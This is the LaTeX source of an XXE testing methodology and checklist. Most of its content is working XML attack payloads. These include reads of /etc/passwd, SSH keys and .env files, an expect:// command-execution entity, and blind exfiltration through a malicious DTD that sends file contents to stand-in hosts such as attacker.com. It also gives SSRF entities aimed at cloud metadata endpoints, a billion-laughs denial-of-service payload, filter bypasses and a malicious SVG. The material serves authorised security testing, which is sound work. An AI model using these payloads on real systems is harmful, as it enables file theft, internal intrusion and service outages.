\documentclass{article}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{url}
\usepackage{graphicx}
\usepackage{geometry}
\usepackage{amssymb}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{multicol}
\usepackage{array}
\usepackage{booktabs}
\usepackage{xcolor}
\usepackage{tcolorbox}
\usepackage{fancyhdr}
\usepackage{longtable}
\tcbuselibrary{skins, breakable}

% Configure listings for code highlighting
\lstset{
    numbers=left,
    numberstyle=\tiny\color{gray},
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!5},
    keywordstyle=\color{blue},
    commentstyle=\color{green!50!black},
    stringstyle=\color{red},
    showstringspaces=false,
    tabsize=2
}

% Define custom colors
\definecolor{method}{RGB}{50,150,200}
\definecolor{check}{RGB}{50,200,100}
\definecolor{exploit}{RGB}{200,100,50}
\definecolor{critical}{RGB}{200,50,50}

% Create custom tcolorbox environments
\newtcolorbox{methodbox}[1][]{colback=method!5,colframe=method!75!black,title=#1}
\newtcolorbox{checklistbox}[1][]{colback=check!5,colframe=check!75!black,title=#1}
\newtcolorbox{exploitbox}[1][]{colback=exploit!5,colframe=exploit!75!black,title=#1}
\newtcolorbox{criticalbox}[1][]{colback=critical!5,colframe=critical!75!black,title=#1}

\newtcolorbox{infobox}[1][]{
    colback=blue!5,
    colframe=blue!75!black,
    title=#1,
    boxrule=1pt,
    arc=4pt,
    breakable
}


\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
\title{XXE Methodology and Testing Checklist}
\author{Eyad Islam El-Taher}
\date{\today}

\begin{document}
\maketitle


\section{Phase 1: Discovery and Attack Surface Mapping}

\subsection{1.1 Identify XML Endpoints}

\begin{checklistbox}[Checklist: Finding XML Input Points]
\begin{itemize}
    \item  Check for \texttt{Content-Type: application/xml} in requests
    \item  Check for \texttt{Content-Type: text/xml} in requests
    \item  Look for SOAP APIs (\texttt{/wsdl}, \texttt{/soap}, \texttt{/api/v1})
    \item  Identify file upload endpoints (SVG, DOCX, XLSX, PPTX)
    \item  Check RSS/Atom feeds (\texttt{/rss}, \texttt{/feed}, \texttt{/xml})
    \item  Look for sitemap files (\texttt{/sitemap.xml})
    \item  Identify REST APIs that might accept XML
    \item  Check for XML-RPC endpoints (\texttt{/xmlrpc}, \texttt{/RPC2})
\end{itemize}
\end{checklistbox}

\subsection{1.2 Discover Hidden XML Attack Surface}

\begin{methodbox}[Hidden Attack Surface Techniques]
\begin{enumerate}
    \item \textbf{Content Type Modification}
    \begin{lstlisting}[basicstyle=\ttfamily\scriptsize]
Change Content-Type to:
- application/xml
- text/xml
- application/soap+xml
    \end{lstlisting}
    
    \item \textbf{File Upload Testing}
    \begin{lstlisting}[basicstyle=\ttfamily\scriptsize]
Test upload of:
- .svg files
- .docx files (rename to .zip, modify XML inside)
- .xlsx files
- .pptx files
    \end{lstlisting}
    
    \item \textbf{Parameter Pollution}
    \begin{lstlisting}[basicstyle=\ttfamily\scriptsize]
Add ?format=xml or &output=xml to URLs
    \end{lstlisting}
\end{enumerate}
\end{methodbox}

\section{Phase 2: Basic Detection}

\subsection{2.1 Simple Entity Test}

The first step is to determine if XML entities are being processed.

\begin{exploitbox}[Basic Detection Payload]
\begin{lstlisting}[language=XML]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY test "TEST123">
]>
<root>&test;</root>
\end{lstlisting}
\end{exploitbox}

\textbf{Expected Result:} The string "TEST123" appears in the response.

\subsection{2.2 Mathematical Evaluation Test}

Some parsers evaluate expressions within entities.

\begin{exploitbox}[Mathematical Test Payload]
\begin{lstlisting}[language=XML]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY test SYSTEM "7*7">
]>
<root>&test;</root>
\end{lstlisting}

Or directly in the element:
\begin{lstlisting}[language=XML]
<root>{{7*7}}</root>
<root>${7*7}</root>
<root><%= 7*7 %></root>
\end{lstlisting}
\end{exploitbox}

\subsection{2.3 External Entity Test (Out-of-Band)}

Test if the parser makes external connections.

\begin{exploitbox}[OOB Detection Payload]
\begin{lstlisting}[language=XML]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-URL">
    %xxe;
]>
<root>test</root>
\end{lstlisting}
\end{exploitbox}

\textbf{Monitor:} DNS lookups and HTTP requests to your collaborator.

\subsection{2.4 Detection Results Matrix}

\begin{table}[h]
\centering
\begin{tabular}{|l|l|l|}
\hline
\textbf{Test} & \textbf{Positive Result} & \textbf{Conclusion} \\
\hline
Simple Entity & Entity replaced with value & XML parsing enabled \\
\hline
Math Evaluation & 49 returned & Expression evaluation possible \\
\hline
OOB Detection & DNS/HTTP callback & External entities enabled \\
\hline
Error Message & File not found error & Error disclosure possible \\
\hline
\end{tabular}

\end{table}

\section{Phase 3: Template Engine Identification}

If mathematical expressions work, you might be dealing with a template engine rather than traditional XXE.

\subsection{3.1 Template Engine Test Matrix}

\begin{longtable}{|l|l|l|}
\hline
\textbf{Payload} & \textbf{Expected Result} & \textbf{Engine} \\
\hline
\{\{7*7\}\} & 49 & Jinja2 (Python) \\
\hline
$\{7*7\}$ & 49 & Freemarker (Java) \\
\hline
<\%= 7*7 \%> & 49 & EJS (Node.js) \\
\hline
\#\{7*7\} & 49 & Pug (Node.js) \\
\hline
\{\{7*7\}\} & \{\{7*7\}\} (no eval) & Twig (PHP) \\
\hline
\{\$smarty.version\} & Version number & Smarty (PHP) \\
\hline
\end{longtable}

\section{Phase 4: Classic XXE Exploitation}

\subsection{4.1 File Read (In-band)}

\begin{exploitbox}[Linux File Read]
\begin{lstlisting}[language=XML]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
\end{lstlisting}
\end{exploitbox}

\subsection{4.2 Common Files to Read}

\begin{checklistbox}[Target Files Checklist]
\subsection*{Linux/Unix}
\begin{itemize}
    \item  \texttt{/etc/passwd} - User accounts
    \item  \texttt{/etc/shadow} - Password hashes (requires root)
    \item  \texttt{/etc/hosts} - Hostname resolution
    \item  \texttt{/etc/hostname} - System hostname
\end{itemize}

\subsection*{Windows}
\begin{itemize}
    \item  \texttt{C:\textbackslash windows\textbackslash win.ini}
    \item  \texttt{C:\textbackslash windows\textbackslash system32\textbackslash drivers\textbackslash etc\textbackslash hosts}
\end{itemize}

\subsection*{Application Specific}
\begin{itemize}
    \item  \texttt{/WEB-INF/web.xml} (Java)
    \item  \texttt{/app/config.py} (Python)
    \item  \texttt{/config/database.yml} (Ruby)
    \item  \texttt{.env} - Environment variables
    \item  \texttt{id\_rsa} - SSH private keys
\end{itemize}
\end{checklistbox}

\subsection{4.3 PHP Wrappers}

\begin{exploitbox}[PHP Filter Wrappers]
\begin{lstlisting}[language=XML]
<!-- Base64 encode to handle binary files -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!-- Read PHP source code -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">

<!-- Expect wrapper (RCE if enabled) -->
<!ENTITY xxe SYSTEM "expect://id">
\end{lstlisting}
\end{exploitbox}

\section{Phase 5: Blind XXE Exploitation}

\subsection{5.1 Out-of-Band (OOB) Detection}

\begin{exploitbox}[OOB Parameter Entity Test]
\begin{lstlisting}[language=XML]
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.com/test">
    %xxe;
]>
<root>test</root>
\end{lstlisting}
\end{exploitbox}

\subsection{5.2 OOB Data Exfiltration}

\subsubsection{Step 1: Host Malicious DTD}
\begin{lstlisting}[language=XML]
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER.com/?data=%file;'>">
%eval;
%exfil;
\end{lstlisting}

\subsubsection{Step 2: Trigger Payload}
\begin{lstlisting}[language=XML]
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/malicious.dtd">
    %xxe;
]>
<root>test</root>
\end{lstlisting}

\subsection{5.3 Error-Based Blind XXE}

\begin{exploitbox}[Error-Based Exfiltration]
\begin{lstlisting}[language=XML]
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
<root>test</root>
\end{lstlisting}
\end{exploitbox}

\subsection{5.4 Local DTD Repurposing}

\begin{exploitbox}[GNOME docbookx.dtd Example]
\begin{lstlisting}[language=XML]
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
\end{lstlisting}
\end{exploitbox}

\subsection{5.5 Common Local DTD Paths}

\begin{checklistbox}[Local DTD Discovery Paths]
\subsection*{Linux}
\begin{itemize}
    \item  \texttt{/usr/share/yelp/dtd/docbookx.dtd}
    \item  \texttt{/usr/share/xml/schema/docbook/4.5/docbookx.dtd}
    \item  \texttt{/usr/share/xml/schema/xml-core/tr9401.dtd}
    \item  \texttt{/usr/share/java/xml-commons/xml-commons-resolver-1.2.dtd}
\end{itemize}

\subsection*{Windows}
\begin{itemize}
    \item  \texttt{C:\textbackslash Program Files\textbackslash Common Files\textbackslash Microsoft Shared\textbackslash VBA\textbackslash VBA6\textbackslash vbext6.olb}
\end{itemize}

\subsection*{Java Applications}
\begin{itemize}
    \item  \texttt{/WEB-INF/web.xml}
    \item  \texttt{/WEB-INF/struts-config.xml}
    \item  \texttt{/META-INF/faces-config.xml}
\end{itemize}
\end{checklistbox}

\section{Phase 6: XInclude Attacks}

Use XInclude when you cannot control the full XML document but control a single data value.

\begin{exploitbox}[XInclude Payload]
\begin{lstlisting}[language=XML]
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <data>
        <xi:include parse="text" href="file:///etc/passwd"/>
    </data>
</root>
\end{lstlisting}
\end{exploitbox}

\begin{exploitbox}[XInclude with HTTP]
\begin{lstlisting}[language=XML]
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="http://internal-server/admin"/>
</root>
\end{lstlisting}
\end{exploitbox}

\section{Phase 7: SSRF via XXE}

Use XXE to probe internal networks and services.

\begin{exploitbox}[SSRF Payloads]
\begin{lstlisting}[language=XML]
<!-- Localhost scanning -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">

<!-- Internal network scanning -->
<!ENTITY xxe SYSTEM "http://10.0.0.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">

<!-- Cloud metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">

<!-- Internal services -->
<!ENTITY xxe SYSTEM "http://internal-api.company.com/health">
<!ENTITY xxe SYSTEM "http://kubernetes.default.svc.cluster.local">
\end{lstlisting}
\end{exploitbox}

\section{Phase 8: Denial of Service (DoS)}

\begin{exploitbox}[Billion Laughs Attack]
\begin{lstlisting}[language=XML]
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
\end{lstlisting}
\end{exploitbox}

\section{Phase 9: Bypass Techniques}

\subsection{9.1 Encoding Bypasses}

\begin{methodbox}[Character Encoding Tricks]
\begin{itemize}
    \item UTF-16 encoding to bypass DTD filters
    \item UTF-32 encoding for some parsers
    \item Use HTML entities: \texttt{\&\#x25;} for \%
    \item Use hexadecimal entities: \texttt{\&\#x25;} 
    \item Use decimal entities: \texttt{\&\#37;}
\end{itemize}
\end{methodbox}

\subsection{9.2 Filter Bypass Payloads}

\begin{exploitbox}[Bypass Attempts]
\begin{lstlisting}[language=XML]
<!-- String concatenation -->
<!ENTITY % start "<!ENTITY&#x25;evil SYSTEM 'file:///etc/passwd'>">

<!-- Using comments -->
<!ENTITY % file SYSTEM "file:///etc/passwd" >
<!--]>
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/%file;'>">
%eval;
%exfil;
<!--
-->

<!-- Case manipulation -->
<!ENTITY % FiLe SYSTEM "file:///etc/passwd">

<!-- Whitespace variation -->
<!ENTITY%0A%0dfile SYSTEM"file:///etc/passwd">
\end{lstlisting}
\end{exploitbox}

\section{Phase 10: File Upload XXE}

\subsection{10.1 SVG XXE}

\begin{exploitbox}[Malicious SVG]
\begin{lstlisting}[language=XML]
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/passwd" > 
]>
<svg width="128px" height="128px" 
     xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink" 
     version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
\end{lstlisting}
\end{exploitbox}

\subsection{10.2 Office Document XXE}

\begin{methodbox}[DOCX/XLSX/PPTX Attack]
\begin{enumerate}
    \item Rename file to .zip
    \item Extract contents
    \item Modify \texttt{[Content\_Types].xml} or other XML files
    \item Add XXE payload
    \item Re-zip and rename back to original extension
    \item Upload file
\end{enumerate}
\end{methodbox}

\newpage
\section{Complete Testing Checklist}

% Add amssymb package in preamble for \square
% \usepackage{amssymb}

\begin{longtable}{|p{2.5cm}|p{9cm}|p{1.5cm}|}
\hline
\textbf{Phase} & \textbf{Test} & \textbf{Status} \\
\hline
\endfirsthead
\hline
\textbf{Phase} & \textbf{Test} & \textbf{Status} \\
\hline
\endhead
\hline
\multicolumn{3}{|r|}{Continued on next page} \\
\hline
\endfoot
\hline
\endlastfoot

Discovery & Identify all XML endpoints & $\square$ \\
\hline
Discovery & Test file upload endpoints & $\square$ \\
\hline
Discovery & Modify Content-Type headers & $\square$ \\
\hline
Detection & Simple entity test & $\square$ \\
\hline
Detection & OOB collaborator test & $\square$ \\
\hline
Detection & Error message analysis & $\square$ \\
\hline
Classic XXE & Linux file read (\texttt{/etc/passwd}) & $\square$ \\
\hline
Classic XXE & Windows file read (\texttt{win.ini}) & $\square$ \\
\hline
Classic XXE & PHP wrapper test & $\square$ \\
\hline
Blind XXE & OOB data exfiltration & $\square$ \\
\hline
Blind XXE & Error-based exfiltration & $\square$ \\
\hline
Blind XXE & Local DTD repurposing & $\square$ \\
\hline
XInclude & XInclude payload test & $\square$ \\
\hline
SSRF & Localhost port scan & $\square$ \\
\hline
SSRF & Internal network scan & $\square$ \\
\hline
SSRF & Cloud metadata access & $\square$ \\
\hline
File Upload & SVG XXE test & $\square$ \\
\hline
File Upload & DOCX XXE test & $\square$ \\
\hline
Bypasses & UTF-16 encoding test & $\square$ \\
\hline
Bypasses & Character entity encoding & $\square$ \\
\hline
DoS & Billion laughs test & $\square$ \\
\hline
\end{longtable}

\section{Resource Note: PayloadsAllTheThings}

\begin{infobox}[External Resource]
For an extensive, community-maintained collection of XXE payloads, refer to the following GitHub repository:\\

\url{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE\%20Injection\#xxe-inside-svg}\\

This repository is an essential reference for testers, providing dozens of ready-to-use payloads for different parsers and bypass techniques.
\end{infobox}

\end{document}